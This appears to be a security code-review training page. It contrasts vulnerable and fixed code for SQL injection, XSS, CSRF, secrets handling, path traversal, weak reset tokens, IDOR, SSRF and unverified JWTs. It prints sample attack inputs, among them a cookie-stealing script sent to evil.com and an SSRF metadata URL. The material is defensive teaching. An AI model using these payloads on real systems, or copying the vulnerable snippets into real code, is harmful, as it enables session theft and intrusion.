OWASP Top 10 in Code Reviews

Q: How do you spot SQL injection, XSS, and CSRF in code reviews?

SQL Injection:

# VULNERABLE
query = f"SELECT * FROM users WHERE email = '{email}'"
# Input: ' OR '1'='1' -- reveals all users

# SAFE: parameterized query
query = "SELECT * FROM users WHERE email = $1"
result = db.execute(query, [email])

XSS (Cross-Site Scripting):

// VULNERABLE: inserting user input as HTML
element.innerHTML = `Welcome, ${userName}`;
// Input: <script>document.location='https://evil.com?c='+document.cookie</script>

// SAFE: use textContent or framework escaping
element.textContent = `Welcome, ${userName}`;
// In React: {userName} is auto-escaped

CSRF (Cross-Site Request Forgery):

# VULNERABLE: state-changing GET without CSRF token
@app.get("/transfer")  # GET should be idempotent!
def transfer(to: str, amount: float):
    # Attacker can embed: <img src="https://bank.com/transfer?to=attacker&amount=1000">
    execute_transfer(current_user, to, amount)

# SAFE: POST with CSRF token
@app.post("/transfer")
def transfer(request: Request, to: str, amount: float):
    verify_csrf_token(request)
    execute_transfer(current_user, to, amount)

Red flags in review: String concatenation in SQL/HTML, innerHTML, missing CSRF tokens on state-changing endpoints, GET requests that modify data.

Q: How do you review code for proper secrets management?

A: Look for hardcoded secrets, insecure storage, and improper handling:

# RED FLAGS in code review:
API_KEY = "sk_live_XXXXXXXXXXXXXXXXXXXX"  # Hardcoded secret!
password = "admin123"  # Default credential!
conn_string = "postgresql://admin:password@prod-db:5432/mydb"  # Credentials in code!

# CORRECT: Use environment variables or secret manager
API_KEY = os.environ["STRIPE_API_KEY"]
# Or better: use a secrets manager
from azure.keyvault.secrets import SecretClient
secret = client.get_secret("stripe-api-key").value

Review checklist for secrets:

  • No secrets in code, config files, or environment variable defaults
  • No secrets in git history (check if secrets were committed then "removed")
  • .gitignore includes .env, *.key, *.pem
  • Secrets loaded from environment variables or a secret manager
  • Different secrets per environment (dev/staging/prod)
  • Secrets not logged (check log statements for request bodies containing tokens)

Tools: git-secrets, trufflehog, detect-secrets (pre-commit hooks that scan for secrets)

Security Spot the Bug

Security Bug #1: File upload endpoint
@app.post("/upload")
async def upload_file(file: UploadFile):
    file_path = f"/uploads/{file.filename}"
    with open(file_path, "wb") as f:
        content = await file.read()
        f.write(content)
    return {"path": file_path}

Vulnerabilities:

  1. Path traversal — filename could be ../../etc/passwd. Sanitize filename or use a generated UUID.
  2. No file type validation — User could upload executable files (.php, .sh).
  3. No file size limit — User could upload a 10GB file and fill the disk.
  4. Serving uploads from app domain — Uploaded HTML/JS could execute in the app's origin (stored XSS). Serve from a separate domain.
Security Bug #2: Password reset
@app.post("/reset-password")
async def reset_password(email: str):
    user = await db.fetch_one("SELECT * FROM users WHERE email = $1", email)
    if not user:
        raise HTTPException(404, "User not found")

    token = str(random.randint(100000, 999999))  # 6-digit code
    await redis.set(f"reset:{token}", user.id, ex=3600)
    await send_email(email, f"Your reset code: {token}")
    return {"message": "Reset email sent"}

Vulnerabilities:

  1. User enumeration — 404 for non-existent emails reveals which emails are registered. Always return the same message.
  2. Weak token — 6-digit numeric code has only 900,000 possibilities. Brute-forceable. Use cryptographically secure random tokens (32+ bytes).
  3. No rate limiting — Attacker can brute-force the token by trying all 900K combinations.
  4. Token stored without hashing — If Redis is compromised, all reset tokens are exposed. Hash the token in storage.
  5. python random module — Not cryptographically secure. Use secrets.token_urlsafe().
Security Bug #3: API authorization
@app.get("/users/{user_id}/orders")
async def get_user_orders(user_id: str, current_user: User = Depends(get_current_user)):
    orders = await db.fetch_all(
        "SELECT * FROM orders WHERE user_id = $1", user_id
    )
    return orders

Vulnerability: IDOR (Insecure Direct Object Reference)

The endpoint authenticates the user but doesn't check if current_user is authorized to view user_id's orders. Any authenticated user can view any other user's orders by changing the URL.

# FIXED: verify authorization
@app.get("/users/{user_id}/orders")
async def get_user_orders(user_id: str, current_user: User = Depends(get_current_user)):
    if current_user.id != user_id and not current_user.is_admin:
        raise HTTPException(403, "Not authorized")
    orders = await db.fetch_all(
        "SELECT * FROM orders WHERE user_id = $1", user_id
    )
    return orders
Security Bug #4: SSRF in webhook registration
@app.post("/webhooks")
async def register_webhook(url: str):
    # Verify the URL is reachable
    response = requests.get(url, timeout=5)
    if response.status_code == 200:
        await db.execute("INSERT INTO webhooks (url) VALUES ($1)", url)
        return {"status": "registered"}
    return {"error": "URL not reachable"}

Vulnerability: SSRF (Server-Side Request Forgery)

The server makes a request to a user-provided URL. Attacker can provide http://169.254.169.254/latest/meta-data/ (AWS metadata endpoint) or http://internal-service:8080/admin to access internal resources.

Fix: Validate URL against allowlist, block private IP ranges, resolve DNS and check the IP, don't follow redirects to internal addresses.

Security Bug #5: JWT handling
import jwt

@app.middleware("http")
async def auth_middleware(request, call_next):
    token = request.headers.get("Authorization", "").replace("Bearer ", "")
    try:
        payload = jwt.decode(token, options={"verify_signature": False})
        request.state.user = payload
    except jwt.DecodeError:
        return JSONResponse(status_code=401, content={"error": "Invalid token"})
    return await call_next(request)

Vulnerability:

  1. Signature verification disabled! — verify_signature: False means anyone can forge a JWT. This is the most critical vulnerability.
  2. No algorithm restriction — Vulnerable to algorithm confusion attack (attacker uses "none" algorithm).
  3. No expiration check — Expired tokens are accepted.
  4. No issuer/audience validation — Tokens from other services are accepted.
# FIXED
payload = jwt.decode(
    token,
    SECRET_KEY,
    algorithms=["RS256"],  # Restrict to expected algorithm
    options={"require": ["exp", "iss", "aud"]},
    issuer="https://auth.example.com",
    audience="api.example.com",
)

Staff-Level Practices

Q: What does staff-level code review look like beyond individual PRs?

A: Staff engineers review at multiple levels:

  • PR reviews — Focus on architecture, failure modes, security (not style)
  • Design document / RFC reviews — Review before code is written. Catch design issues early when they're cheap to fix.
  • Architecture reviews — Periodic review of system-level patterns, dependency graphs, service boundaries
  • Review the reviews — Check that team members are giving quality feedback, not just rubber-stamping

RFC review checklist:

  • Are alternatives considered with tradeoffs?
  • What are the failure modes?
  • How will this be tested?
  • What's the rollback plan?
  • What's the migration strategy for existing data/clients?
  • What metrics will prove this was successful?

      - name: Dependency scan

      - name: Secret scan
        run: trufflehog filesystem . --only-verified
Q: How do you build a healthy code review culture at scale?

A:

  • Set SLAs: Reviews should happen within 4 working hours. Track and report review turnaround time.
  • Small PRs: Encourage PRs under 400 lines. Large PRs get rubber-stamped, not reviewed.
  • Clear expectations: Define what "approval" means (no blocking bugs found, not "I agree with every line").
  • Automate the boring stuff: Linting, formatting, type checking in CI. Humans review logic and design.
  • Rotate reviewers: Don't always assign to the same person. Spread knowledge and prevent bottlenecks.
  • Celebrate good reviews: Recognize engineers who give thorough, educational reviews.
  • Blameless retrospectives: When bugs escape review, discuss the process failure, not the people.

Staff engineer's role: Model the behavior you want. Give thorough reviews on important PRs. Praise good code and good reviews publicly. Set the standard through action, not policy documents.
